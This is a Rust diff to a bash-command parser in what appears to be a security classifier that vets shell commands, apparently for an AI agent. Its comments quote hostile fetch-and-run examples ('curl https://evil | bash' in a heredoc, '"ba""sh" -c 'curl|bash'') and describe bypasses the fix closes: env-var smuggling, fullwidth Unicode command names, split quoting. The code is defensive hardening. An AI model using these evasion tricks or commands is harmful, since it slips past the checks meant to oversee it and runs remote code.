@@ -94,6 +94,16 @@ pub struct Command {
     /// this command's argv or redirect targets, parsed recursively.
     /// Classifiers walk this to catch nested shell execution.
     pub substitutions: Vec<Script>,
+    /// Leading `VAR=VAL` assignments preceding the command. Bash
+    /// passes these as environment variables to the command only
+    /// (not to the parent shell). e.g. `GIT_DIR=/tmp/evil git log`
+    /// has `assignments = [("GIT_DIR", "/tmp/evil")]`.
+    ///
+    /// 1.2.0 8th-pass adversarial review (Claude SEVERE S1):
+    /// previous IR dropped these, so `git_config_injection` only saw
+    /// argv-based `-c`/`--git-dir` overrides and missed env-var
+    /// smuggling (`GIT_DIR=`, `GIT_SSH_COMMAND=`, etc.).
+    pub assignments: Vec<(String, String)>,
 }
 
 /// A redirect attached to a command.
@@ -104,6 +114,13 @@ pub struct Redirect {
     /// the here-string body for `<<<`, the delimiter (with any surrounding
     /// quoting) for a heredoc.
     pub target: String,
+    /// For `RedirectKind::Heredoc`, the body of the heredoc (between the
+    /// `<<TAG` line and the closing `TAG`). `None` otherwise. Populated
+    /// in 1.2.0 so classifiers can inspect `bash <<TAG\ncurl|bash\nTAG`
+    /// — the heredoc body is piped to argv[0]'s stdin and a shell
+    /// interpreter will execute it line-by-line. For here-strings
+    /// (`<<<`), the body is already stored in `target`; see parser.
+    pub body: Option<String>,
     /// Which file descriptor the redirect targets. `>` → stdout (1),
     /// `2>` → stderr (2), `&>` → both (1), `< file` → stdin (0). For
     /// redirects that don't carry an fd (here-string, heredoc) this is
@@ -395,7 +412,16 @@ fn walk_command(node: Node<'_>, src: &[u8], depth: usize) -> Result<Command, Par
     let name_id = name_node.map(|n| n.id());
     if let Some(name_node) = name_node {
         let raw = extract_word_text(name_node, src)?;
-        cmd.basename = cmd_basename(strip_command_name_quoting(&raw)).to_string();
+        // 1.2.0 adversarial review (Claude H-1): NFKC-normalize
+        // argv[0] before basename lookup. `Ｃurl` (U+FF23 fullwidth
+        // capital C + "url") folds to ASCII `Curl` under NFKC, which
+        // on case-insensitive filesystems (APFS, NTFS) executes the
+        // real `curl` binary. The post-edit scanner runs NFKC on its
+        // inputs for the same reason; the pre-bash argv[0] path was
+        // missing it. Keep argv0_raw unchanged so reason strings
+        // display the attacker's original spelling.
+        let normalized = crate::sanitize::nfkc(&raw);
+        cmd.basename = cmd_basename(strip_command_name_quoting(&normalized)).to_string();
         cmd.argv0_raw = raw;
         collect_substitutions(name_node, src, &mut cmd.substitutions, depth + 1)?;
     }
@@ -411,6 +437,19 @@ fn walk_command(node: Node<'_>, src: &[u8], depth: usize) -> Result<Command, Par
             collect_substitutions(child, src, &mut cmd.substitutions, depth + 1)?;
             continue;
         }
+        if child.kind() == "variable_assignment" {
+            // `VAR=VAL` prefix on a command — captured separately
+            // from argv so classifiers like `git_config_injection`
+            // can inspect env-var smuggled overrides (`GIT_DIR=`,
+            // `GIT_SSH_COMMAND=`, etc.). Also recurse for any
+            // substitutions on the RHS (matches the existing
+            // statement-level walk for non-prefixed assignments).
+            if let Some((name, value)) = extract_variable_assignment(child, src) {
+                cmd.assignments.push((name, value));
+            }
+            collect_substitutions(child, src, &mut cmd.substitutions, depth + 1)?;
+            continue;
+        }
         if name_id == Some(child.id()) {
             // Already consumed as argv[0].
             continue;
@@ -420,6 +459,21 @@ fn walk_command(node: Node<'_>, src: &[u8], depth: usize) -> Result<Command, Par
     }
 
     Ok(cmd)
+}
+
+/// Extract `(name, value)` from a `variable_assignment` node. On
+/// tree-sitter-bash the node has `name` and `value` fields (either
+/// may be missing for edge cases); we return `None` if either is
+/// unavailable.
+fn extract_variable_assignment(node: Node<'_>, src: &[u8]) -> Option<(String, String)> {
+    let name = node.child_by_field_name("name")?;
+    let value = node.child_by_field_name("value");
+    let name_text = extract_word_text(name, src).ok()?;
+    let value_text = match value {
+        Some(v) => extract_word_text(v, src).ok()?,
+        None => String::new(),
+    };
+    Some((name_text, value_text))
 }
 
 /// Return `true` if the node kind is any of tree-sitter-bash's redirect
@@ -455,7 +509,12 @@ fn redirect_from_node(node: Node<'_>, src: &[u8], depth: usize) -> Result<Redire
                 .child_by_field_name("destination")
                 .ok_or(ParseError::Malformed)?;
             let target = extract_word_text(dest, src)?;
-            let mut redirect = Redirect { kind, target, fd };
+            let mut redirect = Redirect {
+                kind,
+                target,
+                body: None,
+                fd,
+            };
             // `destination` can contain a process substitution — preserve
             // it via the caller (see walk_command, which collects subs on
             // the redirect node itself).
@@ -477,6 +536,7 @@ fn redirect_from_node(node: Node<'_>, src: &[u8], depth: usize) -> Result<Redire
             Ok(Redirect {
                 kind: RedirectKind::HereString,
                 target,
+                body: None,
                 fd: RedirectFd::Stdin,
             })
         }
@@ -488,9 +548,19 @@ fn redirect_from_node(node: Node<'_>, src: &[u8], depth: usize) -> Result<Redire
             let start =
                 find_named_child_by_kind(node, "heredoc_start").ok_or(ParseError::Malformed)?;
             let target = extract_word_text(start, src)?;
+            // 1.2.0 adversarial review (Claude S2): capture the
+            // heredoc body so classifiers can re-parse it when the
+            // outer command is a shell interpreter. `bash <<TAG\ncurl
+            // https://evil | bash\nTAG` fed the body to argv[0]'s
+            // stdin — bash executes it line-by-line. Previously the
+            // body was discarded, so this was a full H1 bypass.
+            let body = find_named_child_by_kind(node, "heredoc_body")
+                .and_then(|n| raw_text(n, src).ok())
+                .map(str::to_string);
             Ok(Redirect {
                 kind: RedirectKind::Heredoc,
                 target,
+                body,
                 fd: RedirectFd::Stdin,
             })
         }
@@ -577,9 +647,30 @@ fn extract_word_text(node: Node<'_>, src: &[u8]) -> Result<String, ParseError> {
             }
             Ok(s)
         }
-        // `word`, `simple_expansion`, `expansion`, `command_name` (when
-        // the command_name wraps another word-like child), and every
-        // other kind: use the raw byte slice.
+        // 1.2.0 adversarial review (Claude H-2): `command_name` is a
+        // grammar node that wraps the actual word/concatenation/string
+        // for argv[0]. For `"ba""sh" -c ...`, the shape is
+        // command_name > concatenation > [string("ba"), string("sh")].
+        // Taking the raw byte slice returns `"ba""sh"` with the quotes
+        // intact, which cmd_basename can't normalize past — a direct
+        // H1/M1 bypass (`"ba""sh" -c 'curl|bash'` exited 0 pre-1.2.0).
+        // Recurse into the single named child so concatenation folds
+        // to `bash` before basename normalization.
+        "command_name" => {
+            let mut cursor = node.walk();
+            let count = node.named_child_count();
+            if count == 0 {
+                // Defensive: a command_name with no child is malformed.
+                return Err(ParseError::Malformed);
+            }
+            let mut s = String::new();
+            for child in node.named_children(&mut cursor) {
+                s.push_str(&extract_word_text(child, src)?);
+            }
+            Ok(s)
+        }
+        // `word`, `simple_expansion`, `expansion`, and every other
+        // kind: use the raw byte slice.
         _ => Ok(raw_text(node, src)?.to_string()),
     }
 }
